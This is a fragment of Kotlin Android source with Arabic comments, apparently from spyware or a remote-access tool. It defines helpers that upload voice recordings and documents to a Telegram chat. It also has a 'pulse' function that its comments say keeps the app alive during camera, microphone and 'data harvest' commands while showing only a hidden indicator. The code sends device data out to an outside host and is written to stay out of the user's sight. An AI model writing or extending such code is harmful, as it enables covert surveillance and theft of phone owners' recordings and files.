        replyMarkupJson: String? = null
    ): Any? {
        val params = mutableMapOf<String, Any>(
            "chat_id" to chatId,
            "text" to text
        )
        replyMarkupJson?.let { params["reply_markup"] = it }
        return invokeTelegramMethod(tg, "sendMessage", params)
    }

    private suspend fun sendTelegramAction(tg: Any?, chatId: Any, action: String) {
        val params = mapOf(
            "chat_id" to chatId,
            "action" to action
        )
        invokeTelegramMethod(tg, "sendChatAction", params)
    }

    private suspend fun sendTelegramVoice(tg: Any?, chatId: Any, voiceFile: File): Boolean {
        if (tg == null) return false
        return try {
            val params = mapOf("chat_id" to chatId)
            val files = mapOf("voice" to voiceFile)
            val result = invokeMethod(tg, "_api", "sendVoice", params, files)
            if (result != null) {
                val json = result as? JSONObject
                json?.optBoolean("ok") == true
            } else {
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Send voice error: ${e.message}")
            false
        }
    }

    private suspend fun sendTelegramDocument(tg: Any?, chatId: Any, documentFile: File, caption: String): Boolean {
        if (tg == null) return false
        return try {
            val params = mapOf(
                "chat_id" to chatId,
                "caption" to caption
            )
            val files = mapOf("document" to documentFile)
            val result = invokeMethod(tg, "_api", "sendDocument", params, files)
            if (result != null) {
                val json = result as? JSONObject
                json?.optBoolean("ok") == true
            } else {
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Send document error: ${e.message}")
            false
        }
    }

    // ============================================================
    //  ✅ دالة مساعدة لإرسال نبض للخدمة الأمامية
    // ============================================================

    /**
     * إرسال نبض (Pulse) إلى الخدمة الأمامية لإظهار إشعار عابر.
     * يُستخدم قبل تنفيذ الأوامر الحساسة (كاميرا، ميكروفون، حصاد)
     * لتجنب قتل العملية في الخلفية ولإعطاء مؤشر بصري خفي.
     *
     * 📌 الإيموجيات المستخدمة في أنواع النبض:
     * - 📸 Visual Sync → للكاميرا
     * - 🎙️ Audio Sync → للميكروفون
     * - 📦 Data Harvest → للحصاد
     *
     * @param actionType نوع العملية (يحتوي على إيموجي فريد)
     */
    private fun sendPulseIntent(actionType: String) {
        try {
            val intent = Intent(appContext, ForegroundService::class.java).apply {
                action = "PULSE_ACTION"
                putExtra("action_type", actionType)
            }
            appContext?.startService(intent)
            Log.d(TAG, "✅ Pulse intent sent: $actionType")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to send pulse intent: ${e.message}")
        }
    }
}
